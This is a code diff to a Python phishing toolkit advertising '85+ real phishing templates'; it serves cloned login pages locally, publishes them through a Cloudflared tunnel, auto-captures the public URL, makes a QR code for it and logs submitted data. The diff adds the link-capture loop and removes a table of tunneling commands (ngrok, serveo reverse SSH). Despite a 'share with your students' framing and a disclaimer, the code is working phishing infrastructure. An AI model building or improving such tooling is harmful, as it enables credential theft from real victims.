@@ -15,6 +15,7 @@ import requests
 import random
 import string
 import threading
+import re
 import qrcode
 from datetime import datetime
 from colorama import Fore, Style, init
@@ -62,7 +63,7 @@ def banner():
     ║    ║  VERSION: 4.0.0                                        ║   ║
     ║    ║  AUTHOR: EPHIC TRADER                                  ║   ║
     ║    ║  GITHUB: ethicalhacker33-oss                           ║   ║
-    ║    ║  TEMPLATES: 80+ REAL PAGES                             ║   ║
+    ║    ║  TEMPLATES: 85+ REAL PAGES                             ║   ║
     ║    ╚══════════════════════════════════════════════════════════╝   ║
     ║                                                                  ║
     ╚══════════════════════════════════════════════════════════════════╝
@@ -74,7 +75,7 @@ def banner():
     print(Fore.RED + "[!] Do NOT use for illegal activities. Unauthorized use is prohibited.\n" + Style.RESET_ALL)
 
 # ============================================================
-# 80+ REAL PHISHING TEMPLATES
+# 85+ REAL PHISHING TEMPLATES
 # ============================================================
 
 TEMPLATES = {
@@ -166,18 +167,6 @@ TEMPLATES = {
 }
 
 # ============================================================
-# TUNNELING OPTIONS
-# ============================================================
-
-TUNNELING_OPTIONS = {
-    1: {'name': 'Cloudflared', 'command': 'cloudflared tunnel --url localhost:8080'},
-    2: {'name': 'Ngrok', 'command': 'ngrok http 8080'},
-    3: {'name': 'Loclx', 'command': 'loclx tunnel --port 8080'},
-    4: {'name': 'LocalHostRun', 'command': 'lhst --port 8080'},
-    5: {'name': 'Serveo', 'command': 'ssh -R 80:localhost:8080 serveo.net'},
-}
-
-# ============================================================
 # GENERATE REAL PHISHING PAGES
 # ============================================================
 
@@ -251,11 +240,6 @@ def log_data(data):
         f.write(log_entry)
     print(Fore.GREEN + f"[✅] Data logged: {log_entry.strip()}" + Style.RESET_ALL)
 
-def generate_random_link():
-    """Generate random phishing link."""
-    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    return f"https://{random_string}.com/simulate/ephic"
-
 def generate_qr_code(data, filename='phishing_qr.png'):
     """Generate QR code for the link."""
     try:
@@ -271,7 +255,7 @@ def generate_qr_code(data, filename='phishing_qr.png'):
         return None
 
 def start_cloudflared():
-    """Start Cloudflared tunnel."""
+    """Start Cloudflared tunnel and capture the link automatically."""
     global CLOUDFLARED_PROCESS
     print(Fore.YELLOW + "[⏳] Starting Cloudflared tunnel..." + Style.RESET_ALL)
     try:
@@ -279,17 +263,57 @@ def start_cloudflared():
             ['cloudflared', 'tunnel', '--url', f'localhost:{SERVER_PORT}'],
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
-            text=True
+            text=True,
+            bufsize=1
         )
-        time.sleep(5)
-        print(Fore.GREEN + "[✅] Cloudflared tunnel started!" + Style.RESET_ALL)
-        return True
+        
+        # Capture the link from output
+        link = None
+        timeout = 30
+        start_time = time.time()
+        
+        while time.time() - start_time < timeout:
+            line = CLOUDFLARED_PROCESS.stdout.readline()
+            if not line:
+                break
+            # Print the line for user to see
+            print(Fore.CYAN + f"[📡] {line.strip()}" + Style.RESET_ALL)
+            
+            # Look for the link - try multiple patterns
+            if 'trycloudflare.com' in line or 'cfargotunnel.com' in line:
+                # Try different regex patterns
+                patterns = [
+                    r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',
+                    r'https://[a-zA-Z0-9-]+\.cfargotunnel\.com',
+                    r'https://[a-zA-Z0-9-]+\.[a-zA-Z]+\.trycloudflare\.com'
+                ]
+                for pattern in patterns:
+                    match = re.search(pattern, line)
+                    if match:
+                        link = match.group(0)
+                        break
+                if link:
+                    break
+        
+        if link:
+            print(Fore.GREEN + f"\n[✅] Cloudflared tunnel started!" + Style.RESET_ALL)
+            print(Fore.GREEN + f"[🔗] SHARE THIS LINK WITH YOUR STUDENTS: {link}" + Style.RESET_ALL)
+            print(Fore.CYAN + "[📋] Copy this link and open it in a browser." + Style.RESET_ALL)
+            log_data(f"Cloudflared link: {link}")
+            
+            # Also generate QR code for the link
+            generate_qr_code(link)
+            return link
+        else:
+            print(Fore.RED + "[❌] Could not capture Cloudflared link. Please check your internet connection." + Style.RESET_ALL)
+            return None
+            
     except Exception as e:
         print(Fore.RED + f"[❌] Cloudflared error: {e}" + Style.RESET_ALL)
-        return False
+        return None
 
 def start_server():
-    """Start HTTP server."""
+    """Start HTTP server in background."""
     global SERVER_PROCESS
     print(Fore.YELLOW + f"[⏳] Starting HTTP server on port {SERVER_PORT}..." + Style.RESET_ALL)
     try:
@@ -307,7 +331,7 @@ def start_server():
 
 def show_templates():
     """Display available templates."""
-    print(Fore.CYAN + "\n[📋] AVAILABLE TEMPLATES (80+ REAL PAGES):\n" + Style.RESET_ALL)
+    print(Fore.CYAN + "\n[📋] AVAILABLE TEMPLATES (85+ REAL PAGES):\n" + Style.RESET_ALL)
     print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
     count = 0
     for key, template in TEMPLATES.items():
@@ -333,7 +357,7 @@ def select_template():
             print(Fore.RED + "[❌] Please enter a number." + Style.RESET_ALL)
 
 def start_live_demo():
-    """Start a live demo with Cloudflared and selected template."""
+    """Start a live demo with Cloudflared and selected template - all in one window."""
     print(Fore.CYAN + "\n[🚀] STARTING LIVE DEMO WITH CLOUDFLARED" + Style.RESET_ALL)
     print(Fore.YELLOW + "=" * 70 + Style.RESET_ALL)
     
@@ -347,19 +371,20 @@ def start_live_demo():
     if not start_server():
         return
     
-    # Start Cloudflared
-    if not start_cloudflared():
+    # Start Cloudflared and capture link
+    link = start_cloudflared()
+    if not link:
+        print(Fore.RED + "[❌] Failed to start Cloudflared. Exiting..." + Style.RESET_ALL)
         return
     
     print(Fore.GREEN + "\n[✅] Live demo is running!" + Style.RESET_ALL)
     print(Fore.CYAN + f"[📡] Template: {template['name']}" + Style.RESET_ALL)
     print(Fore.CYAN + f"[🔗] File: {template['file']}" + Style.RESET_ALL)
-    print(Fore.CYAN + "[🌐] Share the Cloudflared link above with your students" + Style.RESET_ALL)
+    print(Fore.CYAN + f"[🌐] Link: {link}" + Style.RESET_ALL)
+    print(Fore.YELLOW + "\n[⏳] Press Ctrl+C to stop the demo" + Style.RESET_ALL)
     
     # Log
-    log_data(f"Live demo started: {template['name']} | {template['file']}")
-    
-    print(Fore.YELLOW + "\n[⏳] Press Ctrl+C to stop the demo" + Style.RESET_ALL)
+    log_data(f"Live demo started: {template['name']} | {template['file']} | Link: {link}")
     
     try:
         while True:
@@ -371,6 +396,16 @@ def start_live_demo():
         if SERVER_PROCESS:
             SERVER_PROCESS.terminate()
         print(Fore.GREEN + "[✅] Demo stopped successfully!" + Style.RESET_ALL)
+
+def system_info():
+    """Display system information."""
+    print(Fore.CYAN + "\n[💻] SYSTEM INFORMATION:" + Style.RESET_ALL)
+    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
+    print(Fore.GREEN + f"  OS: {platform.system()} {platform.release()}" + Style.RESET_ALL)
+    print(Fore.GREEN + f"  Architecture: {platform.machine()}" + Style.RESET_ALL)
+    print(Fore.GREEN + f"  Python: {platform.python_version()}" + Style.RESET_ALL)
+    print(Fore.GREEN + f"  Hostname: {platform.node()}" + Style.RESET_ALL)
+    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
 
 # ============================================================
 # MAIN MENU
@@ -446,16 +481,6 @@ def main():
             sys.exit(0)
         except Exception as e:
             print(Fore.RED + f"\n[❌] Error: {e}" + Style.RESET_ALL)
-
-def system_info():
-    """Display system information."""
-    print(Fore.CYAN + "\n[💻] SYSTEM INFORMATION:" + Style.RESET_ALL)
-    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
-    print(Fore.GREEN + f"  OS: {platform.system()} {platform.release()}" + Style.RESET_ALL)
-    print(Fore.GREEN + f"  Architecture: {platform.machine()}" + Style.RESET_ALL)
-    print(Fore.GREEN + f"  Python: {platform.python_version()}" + Style.RESET_ALL)
-    print(Fore.GREEN + f"  Hostname: {platform.node()}" + Style.RESET_ALL)
-    print(Fore.YELLOW + "=" * 50 + Style.RESET_ALL)
 
 if __name__ == "__main__":
     main()
